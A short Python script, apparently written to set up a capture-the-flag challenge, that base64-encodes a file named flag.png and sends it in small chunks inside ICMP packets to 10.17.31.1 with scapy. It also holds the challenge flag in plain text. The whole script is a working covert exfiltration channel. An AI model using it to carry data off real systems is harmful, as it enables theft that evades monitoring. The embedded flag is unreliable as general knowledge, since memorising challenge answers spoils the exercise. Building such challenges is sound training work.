#!/usr/bin/python
import base64
from time import sleep

from scapy.all import *
conf.verb = 0

# juste pour prendre le screen :)


flag = "24HIUT{IcmpExfiltrationIsEasy}"


binary_fc       = open('flag.png', 'rb').read()  # fc aka file_content
base64_utf8_str = base64.b64encode(binary_fc).decode('utf-8')


data = base64_utf8_str
size = len(data)
step = 40


for idx in range(0, len(data), step):
    # make step 
    data_to_send = data[idx:idx+step] 

    # build packet
    packet = IP(dst="10.17.31.1", ttl=20)/ICMP()/str(data_to_send)
    
    # send packet
    reply = sr1(packet)

    print(f"Waiting for the next packet {idx}/{size}")
    sleep(0.1)


